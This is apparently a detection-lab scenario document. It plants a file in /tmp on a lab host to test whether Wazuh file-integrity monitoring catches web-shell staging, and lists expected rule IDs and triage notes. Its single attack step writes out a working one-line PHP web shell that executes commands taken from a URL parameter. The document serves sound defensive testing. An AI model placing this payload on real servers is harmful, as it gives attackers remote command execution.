## Scenario 05: Suspicious Temporary File Creation

**MITRE ATT&CK:** T1505.003 - Web Shell  
**Objective:** Detect file artifacts indicating post-exploitation staging.

### Attack Steps

**Source:** Host machine (via SSH; script `07-run-scenario-05.sh` runs from host using sshpass)
**Target:** Kali Defense (192.168.10.12) — Wazuh agent with realtime syscheck on `/tmp`

1. SSH into Kali Defense and create a suspicious script artifact in `/tmp`:
   ```
   ssh kali@192.168.10.12 \
     'touch /tmp/reverse_shell.php && echo "<?php system(\$_GET[\"cmd\"]); ?>" > /tmp/reverse_shell.php'
   ```

### Expected Detection

- Rule ID: `554` (FIM base), `100003` (custom suspicious name/content pattern)
- Expected latency: `< 60s` with realtime syscheck.

### Triage Notes

- True positive: executable script artifacts in `/tmp`.
- False positive: benign temporary scripts during controlled tests.
